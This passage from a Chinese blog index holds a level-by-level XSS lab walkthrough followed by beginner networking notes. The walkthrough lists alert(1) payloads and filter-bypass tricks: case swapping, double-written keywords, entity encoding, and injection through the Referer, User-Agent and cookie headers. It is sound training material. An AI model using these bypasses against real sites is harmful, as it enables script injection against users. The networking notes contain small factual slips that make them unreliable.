plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>同时还有其他方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">需要鼠标划过输入框</span><br><span class=\"line\">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">需要点击搜索框</span><br><span class=\"line\">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class=\"line\">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p>这关进行了实体转义，<strong>也就是过滤了&lt;&gt;和””,</strong>所以我们可以利用单引号和注释符</p>\n<p>其中转义函数<img src=\"/2020/12/09/xss/image-20200821203827654.png\" alt=\"image-20200821203827654\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class=\"line\">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level4\"><a href=\"#level4\" class=\"headerlink\" title=\"level4\"></a>level4</h2><p>和上一关一样，但需要注意的是<strong>双引号</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class=\"line\">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class=\"line\">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class=\"line\">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level5\"><a href=\"#level5\" class=\"headerlink\" title=\"level5\"></a>level5</h2><p>这个关卡过滤了on，但没有过滤单双引号，<strong>所以可以用伪协议</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class=\"line\">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class=\"line\">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level6\"><a href=\"#level6\" class=\"headerlink\" title=\"level6\"></a>level6</h2><p>script 转换成 scr_ipt        on 转换成 o_n        src 转换成 sr_c        data 转换成 da_ta        href 转换成 hr_ef</p>\n<p><strong>但可以大小写绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class=\"line\">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class=\"line\">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level7\"><a href=\"#level7\" class=\"headerlink\" title=\"level7\"></a>level7</h2><p>过滤了script，on，href</p>\n<p><strong>所以可以双写绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class=\"line\">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level8\"><a href=\"#level8\" class=\"headerlink\" title=\"level8\"></a>level8</h2><p>script,on，src，data，href，大小写失效，”被编码所以value处几乎找不到</p>\n<p>但下面链接处可以看到 &lt;&gt; ‘ % # &amp; 未被过滤 看了别人题解之后是<strong>html实体编码绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class=\"line\">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>\n<h2 id=\"level9\"><a href=\"#level9\" class=\"headerlink\" title=\"level9\"></a>level9</h2><p>不了解，去看了源码是<strong>得加http://</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level10\"><a href=\"#level10\" class=\"headerlink\" title=\"level10\"></a>level10</h2><p>这真想不出来</p>\n<p>试了三个参数，发现只有最后一个可以写入，<strong>直接构造</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class=\"line\">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level11\"><a href=\"#level11\" class=\"headerlink\" title=\"level11\"></a>level11</h2><p>这个题应该是抓包看，但由于我是谷歌做题，火狐抓包，导致每次直接复制11题url它都不会直接抓到ref头，正确应该是在10题向11题跳转时抓包。</p>\n<p><img src=\"/2020/12/09/xss/image-20200822205648946.png\" alt=\"image-20200822205648946\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p>把ref头改成这个，发包即可</p>\n<h2 id=\"level12\"><a href=\"#level12\" class=\"headerlink\" title=\"level12\"></a>level12</h2><p>有了上一个题的提示，这个题就明显很多了</p>\n<p>只要改一下UA头</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level13\"><a href=\"#level13\" class=\"headerlink\" title=\"level13\"></a>level13</h2><p>这个应该是改cookie</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level14\"><a href=\"#level14\" class=\"headerlink\" title=\"level14\"></a>level14</h2><p>链接好像是挂掉了，但好像是没有太看懂，回头再来看一下</p>\n<h2 id=\"level15\"><a href=\"#level15\" class=\"headerlink\" title=\"level15\"></a>level15</h2><p>看源码发现</p>\n<p><img src=\"/2020/12/09/xss/image-20200822213204305.png\" alt=\"image-20200822213204305\"></p>\n<p>然后上网查一下</p>\n<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>\n<p>包含的内容将作为指定元素的子节点。</p>\n<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>\n<p>默认情况下，包含的文件需要包含在<strong>同一个域名</strong>下。</p>\n<p>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>\n<p>也就是说src包含的内容会进入ng-include被包含</p>\n<p>那我们可以想出能不能直接闭合</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>但发现直接被转义了，所以还是不行，只能包含第一关代码</p>\n<h2 id=\"level16\"><a href=\"#level16\" class=\"headerlink\" title=\"level16\"></a>level16</h2><p>这个题是把空格过滤了</p>\n<p>用%0d和%0a绕过</p>\n<p><strong>%0a换行符号”\\n”<br>%0d回车符号”\\r”</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class=\"line\">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level17\"><a href=\"#level17\" class=\"headerlink\" title=\"level17\"></a>level17</h2><p>就找源码和url之间的关系</p>\n<p>可以看见在src处有不同</p>\n<p>&lt;&gt;被过滤，考虑on事件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>\n<h2 id=\"level18\"><a href=\"#level18\" class=\"headerlink\" title=\"level18\"></a>level18</h2><p>和17关一样</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- 反引号代替圆括号</span><br><span class=\"line\">- 换行绕过正则</span><br><span class=\"line\">- &lt;!--不仅可以用--&gt;,也可以用--!&gt;闭合</span><br><span class=\"line\">- &#x2F;&#x2F;可以用换行来绕过</span><br><span class=\"line\">- &lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释</span><br><span class=\"line\">- ſ 符号转换为大写后正好为大写字母 S</span><br><span class=\"line\">- 可以用 %0a 代替空格进行绕过</span><br></pre></td></tr></table></figure>","categories":["web"],"tags":["web"]},{"title":"计网","url":"https://pz1o.top/2020/12/09/计网/","content":"<p>这个只有这一部分了</p>\n<p>后面学了但好像丢了</p>\n<p>看多会学到计网时，再来补这一篇</p>\n<h1 id=\"计网初学\"><a href=\"#计网初学\" class=\"headerlink\" title=\"计网初学\"></a>计网初学</h1><h2 id=\"TCP-IP分层模型\"><a href=\"#TCP-IP分层模型\" class=\"headerlink\" title=\"TCP/IP分层模型\"></a><strong>TCP/IP分层模型</strong></h2><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>应用层（第五层)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>传输层（第四层）</strong></td>\n</tr>\n<tr>\n<td><strong>互联网层（第三层）</strong></td>\n</tr>\n<tr>\n<td><strong>网路接口层（第二层）</strong></td>\n</tr>\n<tr>\n<td><strong>物理层（第一层）</strong></td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>物理层：对应于网络的基本硬件，即我们可以看得见的硬件设备。</p>\n<p>网络接口层：定义了将数据组成正确帧的规程和在网络中传输帧的规程。</p>\n<p>互联网层：本层定义了互联网中传输的信息包的格式，以及从一个用户通过一个或多个路由器到最终目标的信息包转发机制。</p>\n<p>传输层：为两个用户进程之间建立，管理和拆除可靠而又有效的端到端的连接。</p>\n<p>应用层：定义了应用程序使用互联网的规程。</p>\n<h2 id=\"IP地址\"><a href=\"#IP地址\" class=\"headerlink\" title=\"IP地址\"></a>IP地址</h2><p>ip地址分为两部分：网络标识和主机标识</p>\n<p>网络标识：用以标明具体的网络段</p>\n<p>主机标识：某个网络中待定的计算机号码</p>\n<p>网络标识：210.73.140.0</p>\n<p>主机标识：                    2</p>\n<p>合起来写：210.73.140.2</p>\n<p>人们按照网络规模的大小，把32为地址信息设成3种定位的划分方式，三种划分方法分别对应于A，B，C类IP地址，IP地址分为网络号和主机号两部分</p>\n<p>（1）A类IP地址（1-126）</p>\n<p>该地址由1字节网络地址和3字节主机地址组成，网络地址最高位必须是0。</p>\n<p>（2）B类IP地址（128-191）</p>\n<p>该地址由2字节网络地址和2字节主机地址组成，网络地址最高位必须是10。</p>\n<p>（3）C类IP地址（192-223）</p>\n<p>该地址由3字节网络地址和1字节主机地址组成，网络地址最高位必须是110。</p>\n<p>（4）D类IP地址（224-239）</p>\n<p>多点广播地址，用于IP组播。</p>\n<p>（5）E类IP地址（240-225）</p>\n<p>保留地址，用作特殊用途。</p>\n<p>（0.0.0.0）对应当前主机，（255.255.255.255）是当前子网的传播地址。</p>\n<h2 id=\"域名\"><a href=\"#域名\" class=\"headerlink\" title=\"域名\"></a>域名</h2><p>顶级域名 .com</p>\n<p>二级域名 test.com</p>\n<p>三级域名 test.cn.com</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png\" alt=\"image-20200609213455144\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png\" alt=\"image-20200609214339970\"></p>\n<h2 id=\"DNS服务器\"><a href=\"#DNS服务器\" class=\"headerlink\" title=\"DNS服务器\"></a>DNS服务器</h2><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png\" alt=\"image-20200609214938548\"></p>\n<h1 id=\"计网学习\"><a href=\"#计网学习\" class=\"headerlink\" title=\"计网学习\"></a>计网学习</h1><h2 id=\"第一章-计算机网络概述\"><a href=\"#第一章-计算机网络概述\" class=\"headerlink\" title=\"第一章 计算机网络概述\"></a>第一章 计算机网络概述</h2><p>局域网：覆盖范围小  自己花钱买设备  带宽固定</p>\n<p>广域网：距离远 花钱买服务</p>\n<p>Internet ：有自己的机房  对网民提供连接。</p>\n<p>IP地址：网络中的地址。</p>\n<p>物理地址：Mac地址，电脑出厂时已固定。</p>\n<p>网关：下图中的G就是网关，相当于网络中的一个关卡。网关地址为G的IP地址。</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png\" alt=\"image-20200609224145835\"></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>本机ip</th>\n<th>访问ip</th>\n<th>本机mac</th>\n<th>下次访问mac</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>15.0.0.2</td>\n<td>13.0.0.2</td>\n<td>m4</td>\n<td>m5</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong>OSI参考模型</strong></p>\n<ul>\n<li>应用层：能产生网络流量的程序</li>\n<li>表示层：在传输之前是否加密或压缩处理</li>\n<li>会话层：查正在进行会话的程序 netstat -nb</li>\n<li>传输层：可靠传输（TCP）和流量控制 不可靠传输（UDP）</li>\n<li>网络层：选择最佳路径 规划IP地址</li>\n<li>数据链路层：帧的开始和结束。差错检查。</li>\n<li>物理层：接口标准和电器标准</li>\n</ul>\n<p><strong>OSI参考模型网络排错指导</strong></p>\n<ol>\n<li>物理层故障：查看连接状态，发送和接受的数据包</li>\n<li>数据链路层：MAC地址冲突、网速协商不一致、计算机VLAN错误</li>\n<li>网络层故障：配置错误的IP地址 子网掩码和错误的网关</li>\n<li>应用层故障：应用错误代理。</li>\n</ol>\n<p>检查网络是否通畅：ping一个网址</p>\n<p><strong>OSI参考模型和网络安全</strong></p>\n<ol>\n<li>物理层安全</li>\n<li>数据链路层安全：登录需要账号和密码</li>\n<li>网络层安全：路由器限制数据包流量</li>\n<li>应用层安全：开发程序有没有漏洞<img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png\" alt=\"image-20200610122326325\"></li>\n</ol>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png\" alt=\"image-20200610122957433\"></p>\n<h2 id=\"第二章-物理层\"><a href=\"#第二章-物理层\" class=\"headerlink\" title=\"第二章 物理层\"></a>第二章 物理层</h2><h3 id=\"0x01物理层的基本概念\"><a href=\"#0x01物理层的基本概念\" class=\"headerlink\" title=\"0x01物理层的基本概念\"></a>0x01物理层的基本概念</h3><p>物理层解决如何连接在各种计算机的<strong>传输媒体上</strong>传输<strong>数据比特流</strong>，不是指具体的传输媒体。</p>\n<p>物理层主要是确定传输媒体的接口的一些特性。有机械，电器，功能，过程特性。</p>\n<h3 id=\"0x02数据通信知识\"><a href=\"#0x02数据通信知识\" class=\"headerlink\" title=\"0x02数据通信知识\"></a>0x02数据通信知识</h3><p><strong>数据通信模型</strong>：</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png\" alt=\"image-20200611101252348\"></p>\n<p>数据：运送消息的实体。</p>\n<p>信号：数据电气或电磁的表现。</p>\n<p>信道：表示一个方向传送信息的媒体。</p>\n<p>单向通信，双向交替通信，双向同时通信。</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png\" alt=\"image-20200611103259080\"></p>\n<h3 id=\"0x03物理层下面的传输媒体\"><a href=\"#0x03物理层下面的传输媒体\" class=\"headerlink\" title=\"0x03物理层下面的传输媒体\"></a>0x03物理层下面的传输媒体</h3><p>无屏蔽双绞线UTP</p>\n<p>屏蔽双绞线STP</p>\n<p>同轴电缆</p>\n<p>光纤</p>\n<p>微波传输</p>\n<p>物理层设备—集线器</p>\n<h3 id=\"0x04信道复用技术\"><a href=\"#0x04信道复用技术\" class=\"headerlink\" title=\"0x04信道复用技术\"></a>0x04信道复用技术</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png\" alt=\"image-20200611121924344\"></p>\n<h3 id=\"0x05数字传输系统\"><a href=\"#0x05数字传输系统\" class=\"headerlink\" title=\"0x05数字传输系统\"></a>0x05数字传输系统</h3><h3 id=\"0x06宽带接入技术\"><a href=\"#0x06宽带接入技术\" class=\"headerlink\" title=\"0x06宽带接入技术\"></a>0x06宽带接入技术</h3><p>ADSL</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png\" alt=\"image-20200611122852820\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png\" alt=\"image-20200611123214486\"></p>\n<p>光纤</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png\" alt=\"image-20200611123435591\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png\" alt=\"image-20200611123546821\"></p>\n<h2 id=\"第三章数据链路层\"><a href=\"#第三章数据链路层\" class=\"headerlink\" title=\"第三章数据链路层\"></a>第三章数据链路层</h2><h3 id=\"0x01数据链路层基本概念\"><a href=\"#0x01数据链路层基本概念\" class=\"headerlink\" title=\"0x01数据链路层基本概念\"></a>0x01数据链路层基本概念</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png\" alt=\"image-20200615185534103\"></p>\n<p>数据链路层信道类型：点到点和广播。</p>\n<p>链路：是一条点到点的物理线路段。</p>\n<p>数据链路：除了物理线路外，还必须有通信协议来控制这些数据的传输。</p>\n<p>帧：帧头 帧尾 mac地址 校验码</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png\" alt=\"image-20200615190949900\"></p>\n<h3 id=\"0x02数据链路层的三个基本问题\"><a href=\"#0x02数据链路层的三个基本问题\" class=\"headerlink\" title=\"0x02数据链路层的三个基本问题\"></a>0x02数据链路层的三个基本问题</h3><p>1.封装成帧</p>\n<p>2.透明传输（将转义字符转义）</p>\n<p>3.差错控制</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png\" alt=\"image-20200615194723467\"></p>\n<p>传的数据为<strong>101001001</strong>/1101余数为0就会接受。</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png\" alt=\"image-20200615195101214\"></p>\n<h3 id=\"0x03两种情况下的数据链路层\"><a href=\"#0x03两种情况下的数据链路层\" class=\"headerlink\" title=\"0x03两种情况下的数据链路层\"></a>0x03两种情况下的数据链路层</h3><p><strong>点到点信道的数据链路层</strong>（广域网）</p>\n<p>PPP协议</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png\" alt=\"image-20200615195355465\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png\" alt=\"image-20200615201603443\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png\" alt=\"image-20200615195843590\"></p>\n<p><strong>广播信道的数据链路层</strong>（集线器）</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png\" alt=\"image-20200615205445679\"></p>\n<h3 id=\"0x04以太网\"><a href=\"#0x04以太网\" class=\"headerlink\" title=\"0x04以太网\"></a>0x04以太网</h3><p>以太网是一种CSMA/CD的局域网</p>\n<p><strong>媒体接入控制层</strong>（MAC ）</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png\" alt=\"image-20200615211139871\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png\" alt=\"image-20200615211817436\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png\" alt=\"image-20200615212131635\"></p>\n<p>FCS抓包之后会删掉。</p>\n<h3 id=\"0x05扩展以太网\"><a href=\"#0x05扩展以太网\" class=\"headerlink\" title=\"0x05扩展以太网\"></a>0x05扩展以太网</h3><p>集线器级联，会使网络中计算机数量增加，但会使冲突域增大，如何优化呢？</p>\n<p><strong>网桥</strong><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png\" alt=\"image-20200615214530777\"></p>\n<p>网桥就是交换机的前身，交换机相当于网桥和集线器。</p>\n<h3 id=\"0x06高速以太网\"><a href=\"#0x06高速以太网\" class=\"headerlink\" title=\"0x06高速以太网\"></a>0x06高速以太网</h3><h2 id=\"第四章-网络层\"><a href=\"#第四章-网络层\" class=\"headerlink\" title=\"第四章 网络层\"></a>第四章 网络层</h2><h3 id=\"0x01网络层提供的服务\"><a href=\"#0x01网络层提供的服务\" class=\"headerlink\" title=\"0x01网络层提供的服务\"></a>0x01网络层提供的服务</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png\" alt=\"image-20200616110826298\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png\" alt=\"image-20200616111607056\"></p>\n<p>（路由器是网络层设备）</p>\n<p>网络地址相同就可以看成一个<strong>网段</strong>，怎么看网络地址呢？可以看子网掩码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip:10.0.0.1</span><br><span class=\"line\">子网掩码:255.0.0.0</span><br><span class=\"line\">&#x2F;&#x2F;此时，我们可以看出子网掩码是255，那表明ip地址中10就是网络地址。</span><br><span class=\"line\"></span><br><span class=\"line\">ip:12.0.0.1</span><br><span class=\"line\">子网掩码255.255.0.0</span><br><span class=\"line\">&#x2F;&#x2F;255.255.0.0说明在这个网段中12.0是网络地址</span><br><span class=\"line\"></span><br><span class=\"line\">网关：路由器上配置，一般为该网段中的第一个地址，实际上任意一个地址都可以。</span><br><span class=\"line\"></span><br><span class=\"line\">路由器：路由器是无法知道它具体网段的位置，需要添加路由表。</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png\" alt=\"image-20200616114228562\"></p>\n<h3 id=\"0x02网络设备和OSI参考模型\"><a href=\"#0x02网络设备和OSI参考模型\" class=\"headerlink\" title=\"0x02网络设备和OSI参考模型\"></a>0x02网络设备和OSI参考模型</h3><p>发送端：</p>\n<ol>\n<li><p>应用层 程序准备要传输的文件</p>\n</li>\n<li><p>传输层 将文件编号</p>\n</li>\n<li><p>网络层 添加IP地址</p>\n</li>\n<li><p>数据链路层  有两种情况 </p>\n<p>第一种 通过子网掩码 ，判断是否是同一个网段。如果是，利用ARP协议广播解析目标ip地址的MAC地址</p>\n<p>第二种</p>\n</li>\n</ol>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png\" alt=\"image-20200617112108377\"></p>\n<h3 id=\"0x03网络层协议\"><a href=\"#0x03网络层协议\" class=\"headerlink\" title=\"0x03网络层协议\"></a>0x03网络层协议</h3><h4 id=\"ARP协议\"><a href=\"#ARP协议\" class=\"headerlink\" title=\"ARP协议\"></a><strong>ARP协议</strong></h4><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png\" alt=\"image-20200617113421057\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a  &#x2F;&#x2F;查询mac地址</span><br><span class=\"line\">arp -s ip地址 mac地址   &#x2F;&#x2F;配置IP地址的MAC地址</span><br></pre></td></tr></table></figure>\n<p>arp协议:将ip地址通过广播 目标MAC地址是FF-FF-FF-FF-FF-FF<strong>解析目标ip地址的MAC地址</strong></p>\n<p>arp欺骗: 数据链路层故障，缓存了错误的MAC地址</p>\n<h4 id=\"网际控制报文协议（ICMP）\"><a href=\"#网际控制报文协议（ICMP）\" class=\"headerlink\" title=\"网际控制报文协议（ICMP）\"></a><strong>网际控制报文协议</strong>（ICMP）</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ping      ttl&#x3D;64 linux</span><br><span class=\"line\">\t\t\t\t\t\t\t128 windows</span><br><span class=\"line\">\t\t\t\t\t\t\t255 unix</span><br><span class=\"line\">ping www.baidu.com -t    一直ping</span><br><span class=\"line\">ping www.baidu.com -l 200   定义数据包的大小</span><br><span class=\"line\">&#x2F;&#x2F;查看路由器的地址</span><br><span class=\"line\">ping 8.8.8.8 -i 1 更改数据包ttl时间，可以跟踪途经的路由器</span><br><span class=\"line\">pathping   跟踪ping的路径</span><br><span class=\"line\">tracert    直接跟踪路由</span><br></pre></td></tr></table></figure>\n<h4 id=\"IGMP\"><a href=\"#IGMP\" class=\"headerlink\" title=\"IGMP\"></a>IGMP</h4><p>配置在路由器上扫描多播地址的协议</p>\n<p>广播：目标ip地址是全ff，目标mac地址是255，向局域网内所有计算机发出广播</p>\n<p>点到点：从一个点到另一个点</p>\n<p>组播：一对多</p>\n<h3 id=\"0x04数据包\"><a href=\"#0x04数据包\" class=\"headerlink\" 